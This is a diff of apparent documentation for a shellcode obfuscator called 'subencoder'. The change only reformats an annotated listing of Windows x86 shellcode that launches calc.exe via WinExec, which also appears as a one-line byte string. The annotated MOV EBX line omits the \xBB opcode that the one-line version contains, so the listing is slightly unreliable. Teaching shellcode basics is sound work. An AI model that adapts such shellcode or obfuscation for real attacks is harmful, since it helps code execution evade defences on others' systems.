@@ -3,15 +3,15 @@ subencoder - shellcode obfuscater
   
 Calc.exe Shellcode:  
   
-"\x33\xc0".....................XOR EAX,EAX | Zero out EAX register  
-"\x50".........................PUSH EAX | Push EAX to have null-byte padding for "calc.exe"  
-"\x68\x2E\x65\x78\x65".........PUSH ".exe"  
-"\x68\x63\x61\x6C\x63".........PUSH "calc" 
-"\x8B\xC4".....................MOV EAX,ESP | Put a pointer to the ASCII string in EAX 
-"\x6A\x01".....................PUSH 1 | Push uCmdShow parameter to the stack 
-"\x50".........................PUSH EAX | Push the pointer to lpCmdLine to the stack 
-"\x85\x6a\xe9\x77".............MOV EBX, 77e96a85 | Move the pointer to WinExec() into EBX 
-"\xFF\xD3".....................CALL EBX | Call WinExec()
+"\x33\xc0".....................XOR EAX,EAX | Zero out EAX register<br/>
+"\x50".........................PUSH EAX | Push EAX to have null-byte padding for "calc.exe"<br/>
+"\x68\x2E\x65\x78\x65".........PUSH ".exe"  <br/>
+"\x68\x63\x61\x6C\x63".........PUSH "calc" <br/>
+"\x8B\xC4".....................MOV EAX,ESP | Put a pointer to the ASCII string in EAX <br/>
+"\x6A\x01".....................PUSH 1 | Push uCmdShow parameter to the stack <br/>
+"\x50".........................PUSH EAX | Push the pointer to lpCmdLine to the stack <br/>
+"\x85\x6a\xe9\x77".............MOV EBX, 77e96a85 | Move the pointer to WinExec() into EBX <br/>
+"\xFF\xD3".....................CALL EBX | Call WinExec()<br/>
 
 In one line:  
 \x33\xc0\x50\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x8B\xC4\x6A\x01\x50\xBB\x85\x6a\xe9\x77\xFF\xD3  
